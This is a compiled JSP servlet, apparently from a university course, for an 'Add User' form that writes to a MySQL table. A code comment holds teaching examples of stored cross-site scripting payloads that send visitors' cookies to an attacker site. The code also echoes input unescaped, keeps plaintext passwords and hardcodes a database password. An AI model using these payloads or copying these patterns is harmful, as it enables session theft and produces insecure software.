package org.apache.jsp;

import javax.servlet.*;
import javax.servlet.http.*;
import javax.servlet.jsp.*;
import java.sql.*;

public final class deleteme_jsp extends org.apache.jasper.runtime.HttpJspBase
    implements org.apache.jasper.runtime.JspSourceDependent {


// can put methods here if you want to...

  private static final JspFactory _jspxFactory = JspFactory.getDefaultFactory();

  private static java.util.List<String> _jspx_dependants;

  private org.glassfish.jsp.api.ResourceInjector _jspx_resourceInjector;

  public java.util.List<String> getDependants() {
    return _jspx_dependants;
  }

  public void _jspService(HttpServletRequest request, HttpServletResponse response)
        throws java.io.IOException, ServletException {

    PageContext pageContext = null;
    HttpSession session = null;
    ServletContext application = null;
    ServletConfig config = null;
    JspWriter out = null;
    Object page = this;
    JspWriter _jspx_out = null;
    PageContext _jspx_page_context = null;

    try {
      response.setContentType("text/html;charset=UTF-8");
      pageContext = _jspxFactory.getPageContext(this, request, response,
      			null, true, 8192, true);
      _jspx_page_context = pageContext;
      application = pageContext.getServletContext();
      config = pageContext.getServletConfig();
      session = pageContext.getSession();
      out = pageContext.getOut();
      _jspx_out = out;
      _jspx_resourceInjector = (org.glassfish.jsp.api.ResourceInjector) application.getAttribute("com.sun.appserv.jsp.resource.injector");

      out.write(" \n");
      out.write("\n");
      out.write("\n");
      out.write("<!DOCTYPE html>\n");
      out.write("<html>\n");
      out.write("    <head>\n");
      out.write("        <meta http-equiv=\"Content-Type\" content=\"text/html; charset=UTF-8\">\n");
      out.write("        <title>JSP Page</title>\n");
      out.write("        <style>\n");
      out.write("            .error {color:red; font-weight: bold}\n");
      out.write("        </style>\n");
      out.write("    </head>\n");
      out.write("    <body>\n");
      out.write("\n");
      out.write("        ");

            String strUserEmail = "";
            String strUserPw = "";
            String strUserInfo = "";
            String strUserRole = "";

            String strUserEmailMsg = "";
            String strUserPwMsg = "";
            String strUserInfoMsg = "";
            String strUserRoleMsg = "";

            String formMsg = ""; // e.g., record inserted or please edit and retry.X

            Connection con = null;

            try {
                String DRIVER = "com.mysql.jdbc.Driver";
                Class.forName(DRIVER).newInstance();

                //if you have mysql installed locally, cis2308 is the name of my database/schema, no pw
                //String url = "jdbc:mysql://localhost/cis2308?user=root";
                //if you are at home tunnelled into cis-linux2
                String url = "jdbc:mysql://localhost:3307/SP11_2308_sallyk?user=sallyk&password=loh3Nito";

                //if you are running from wachman labs or published
                //String url = "jdbc:mysql://CIS-Linux2.temple.edu:3306/SP11_2308_sallyk?user=sallyk&password=loh3Nito";
                con = DriverManager.getConnection(url);

                if (request.getParameter("userEmail") != null) { // postback, not 1st display

                    // extract user values from URL
                    strUserEmail = request.getParameter("userEmail");
                    strUserPw = request.getParameter("userPw");
                    strUserInfo = request.getParameter("userInfo");
                    strUserRole = request.getParameter("userRole");

                    // "validate"
                    if (strUserEmail.length() == 0) { // didnt pass validation
                        // for this simple insert, we're only making sure they entered a value into user email.
                        strUserEmailMsg = "User Email is required";
                        formMsg = "Please try again.";
                    } else {  // "passed validation" - so try to insert.

                        PreparedStatement ps;
                        String sql = "INSERT INTO web_user (user_email, user_password, user_info, user_role_id) "
                                + "  VALUES (?,?,?,?)";  // no insert into the web_user_id (auto-increment field)

                        try { // try to insert
                            ps = con.prepareStatement(sql);
                            ps.setString(1, strUserEmail);
                            ps.setString(2, strUserPw);
                            ps.setString(3, strUserInfo);
                            ps.setString(4, strUserRole);

                            int numRows = ps.executeUpdate();
                            if (numRows == 1) {
                                formMsg = (strUserEmail + " Inserted.");
                            } else { // inserted 0 recs or > 1 recs
                                formMsg = (new Integer(numRows).toString() + " records were inserted (unexpected).");
                            }
                        } // try to insert
                        catch (SQLException e) {
                            if (e.getSQLState().equalsIgnoreCase("S1000")) {
                                formMsg = "Can't add - record with that ID exists (should not happen since web_user has auto-increment primary key).";
                            } else {
                                formMsg = "Problem with SQL in WebUserSql.insert(): " + "SQLState:" + e.getSQLState() + ", Error message: " + e.getMessage();
                            }
                        } // catch special sql exception
                        catch (Exception e) { // any exception (while trying to insert)
                            formMsg = "General Error in WebUserSql.insert(): " + e.getMessage();
                        } // catch any exception (while trying to insert)
                    } // passed validation (insert code)
                } // postback 
            } // try to get connection
            catch (Exception e) { // problem getting driver or connection
                formMsg = "problem getting connection:" + e.getMessage();
            }

            /* This is an example of what a hacker could enter for javascript injection attack
            
             <form name='myform' action='http://astro.temple.edu/~sallyk' method='get'>
             <input type='text' size='40' name='myTextBox'>
             </form>
            
             <script>
             alert ('users cookie is '+document.cookie); // hacker would not leave this in
             document.myform.myTextBox.value=document.cookie;
             alert ('see cookie values now in the textbox...'); // hacker would not leave this in
             document.myform.submit();
             </script>
            
            
             OR THEY COULD DO THIS (more simple):
            
             Love the product. <script>
             document.location="http://attackerSite.com/getCookies.JSP?cookieVals="+ document.cookie;
             </script>

            Whoever views the page that has this data in it will find themselves at the attacker site, 
            but, more importantly, the getCookie.jsp page from the attacker site would have 
            the user's cookie credentials.
             */
        
      out.write("\n");
      out.write("\n");
      out.write("        <h1>Add User</h1>\n");
      out.write("        <form name=\"myForm\" action=\"03_javascript_injection.jsp\" method=\"GET\">\n");
      out.write("            <table style=\"padding:5px;\">\n");
      out.write("                <tr>\n");
      out.write("                    <td>User Email</td>\n");
      out.write("                    <td><input type=\"text\" name=\"userEmail\" value=\"");
      out.print(strUserEmail);
      out.write("\" ></td>\n");
      out.write("                    <td class=\"error\">");
      out.print(strUserEmailMsg);
      out.write("</td>\n");
      out.write("                </tr>\n");
      out.write("                <tr>\n");
      out.write("                    <td>Password</td>\n");
      out.write("                    <td><input type=\"text\" name=\"userPw\" value=\"");
      out.print(strUserPw);
      out.write("\" ></td>\n");
      out.write("                    <td class=\"error\">");
      out.print(strUserPwMsg);
      out.write("</td>\n");
      out.write("                </tr>\n");
      out.write("                <tr>\n");
      out.write("                    <td>User Info</td>\n");
      out.write("                    <td><textarea name=\"userInfo\" rows=\"10\" cols=\"100\">");
      out.print(strUserInfo);
      out.write("</textarea></td>\n");
      out.write("                    <td class=\"error\">");
      out.print(strUserInfoMsg);
      out.write("</td>\n");
      out.write("                </tr>\n");
      out.write("                <tr>\n");
      out.write("                    <td>Role</td>\n");
      out.write("                    <td><input type=\"text\" name=\"userRole\" value=\"");
      out.print(strUserRole);
      out.write("\" ></td>\n");
      out.write("                    <td class=\"error\">");
      out.print(strUserRoleMsg);
      out.write("</td>\n");
      out.write("                </tr>\n");
      out.write("                <tr>\n");
      out.write("                    <td>&nbsp;</td>\n");
      out.write("                    <td></td>\n");
      out.write("                    <td></td>\n");
      out.write("                </tr>\n");
      out.write("                <tr>\n");
      out.write("                    <td></td>\n");
      out.write("                    <td> <input type=\"submit\" value=\"Submit\" ></td>\n");
      out.write("                    <td></td>\n");
      out.write("                </tr>\n");
      out.write("            </table>\n");
      out.write("        </form>\n");
      out.write("        <br/>\n");
      out.write("        <span class=\"error\">");
      out.print(formMsg);
      out.write("</span>\n");
      out.write("        <br/>\n");
      out.write("        <br/>\n");
      out.write("        <a href=\"displayUsers.jsp\"> List Users </a>\n");
      out.write("        <br/>\n");
      out.write("        <br/>\n");
      out.write("        Check in the JSP comments of this code to see what the hacker could enter.\n");
      out.write("    </body>\n");
      out.write("</html>\n");
      out.write('\n');
      out.write('\n');
    } catch (Throwable t) {
      if (!(t instanceof SkipPageException)){
        out = _jspx_out;
        if (out != null && out.getBufferSize() != 0)
          out.clearBuffer();
        if (_jspx_page_context != null) _jspx_page_context.handlePageException(t);
        else throw new ServletException(t);
      }
    } finally {
      _jspxFactory.releasePageContext(_jspx_page_context);
    }
  }
}
